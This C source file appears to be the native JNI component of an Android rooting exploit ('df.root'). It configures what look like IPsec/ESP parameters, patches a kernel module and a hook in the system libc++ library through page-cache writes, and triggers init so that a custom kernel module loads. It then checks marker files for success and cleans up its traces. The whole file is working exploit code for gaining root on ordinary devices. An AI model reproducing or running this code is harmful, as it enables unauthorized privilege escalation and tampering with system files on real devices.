#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include "exploit.h"

static jmethodID report_mid;

JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *unused __attribute__((unused))) {
    JNIEnv *env;
    (*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4);
    jclass type = (*env)->FindClass(env, "df/root/IReporter");
    report_mid = (*env)->GetMethodID(env, type, "report", "(Ljava/lang/String;)V");
    return JNI_VERSION_1_4;
}

void reportfmt(struct Reporter *r, const char *fmt, ...) {
    char text[1024];
    va_list args;
    va_start(args, fmt);
    vsnprintf(text, sizeof(text), fmt, args);
    va_end(args);
    jstring message = (*r->env)->NewStringUTF(r->env, text);
    (*r->env)->CallVoidMethod(r->env, r->obj, report_mid, message);
    (*r->env)->ExceptionClear(r->env);
    (*r->env)->DeleteLocalRef(r->env, message);
}

extern char libcxx_start[], libcxx_data[], libcxx_first_inst_copy[];
extern uint32_t libcxx_len;

static long monotonic_ms(void) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    return now.tv_sec * 1000L + now.tv_nsec / 1000000L;
}

JNIEXPORT jint JNICALL
Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
        jobject reporter_obj, jstring ko_target_path, jint encap_port, jint spi,
        jbyteArray aes_key_array, jbyteArray hmac_key_array, jint icv_len,
        jint sender_port, jboolean soft_reboot) {
    struct Reporter ro = {.env = env, .obj = reporter_obj};
    struct Reporter *reporter = &ro;
    long total_started = monotonic_ms();
    uint8_t aes_key[32], hmac_key[32];

    jbyte *bytes = (*env)->GetByteArrayElements(env, aes_key_array, NULL);
    memcpy(aes_key, bytes, sizeof(aes_key));
    (*env)->ReleaseByteArrayElements(env, aes_key_array, bytes, JNI_ABORT);
    bytes = (*env)->GetByteArrayElements(env, hmac_key_array, NULL);
    memcpy(hmac_key, bytes, sizeof(hmac_key));
    (*env)->ReleaseByteArrayElements(env, hmac_key_array, bytes, JNI_ABORT);

    const char *target = (*env)->GetStringUTFChars(env, ko_target_path, NULL);
    if (!target) return 3;
    stages_configure(target, soft_reboot);
    cbc_configure(encap_port, sender_port, (uint32_t)spi, aes_key, hmac_key,
                  icv_len, target);
    (*env)->ReleaseStringUTFChars(env, ko_target_path, target);

    struct PatchRestore libcxx_restore = {0};
    int rc = 3;
    long stage_started = monotonic_ms();
    if (patch_ko(reporter)) goto done;
    REPORTLN("[TIMING] stage=payload-patch elapsed_ms=%ld", monotonic_ms() - stage_started);
    stage_started = monotonic_ms();
    if (patch_hook("/system/lib64/libc++.so",
            "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
            libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
            reporter, &libcxx_restore)) goto done;
    REPORTLN("[TIMING] stage=libcxx-hook elapsed_ms=%ld", monotonic_ms() - stage_started);

    rc = 2;
    /* Page-cache writes are synchronous; only yield briefly before triggering init. */
    usleep(5000);
    REPORTLN("* triggering...");
    create_orphan_process(reporter);
    REPORTLN("[TIMING] stage=trigger-dispatch elapsed_ms=%ld", monotonic_ms() - stage_started);

    static const struct { const char *path, *msg; int rc; } markers[] = {
        {"/dev/df", "libc++: mutex acquired, loading custom module", -1},
        {"/dev/dfm0", "***SUCCESS***", 0},
        {"/dev/dfm1", "***FAILED***: ksud exited with error", 1},
    };
    int seen[sizeof(markers) / sizeof(markers[0])] = {0};
    for (int elapsed = 0; elapsed < 5000; elapsed += 10) {
        usleep(10000);
        for (size_t i = 0; i < sizeof(markers) / sizeof(markers[0]); ++i) {
            if (!seen[i] && has_marker(markers[i].path)) {
                seen[i] = 1;
                REPORTLN("%s", markers[i].msg);
                if (markers[i].rc >= 0) { rc = markers[i].rc; goto done; }
            }
        }
    }
    REPORTLN("***FAILED***: check logs");
done:
    if (rc == 3) REPORTLN("***FAILED***: failed to patch files");
    REPORTLN("\n=== cleanup ===");
    restore_hook(&libcxx_restore, reporter);
    fadvise_drop(CRASH_DUMP_PATH, reporter);
    free(libcxx_restore.shell_orig);
    REPORTLN("[TIMING] stage=total elapsed_ms=%ld", monotonic_ms() - total_started);
    return rc;
}
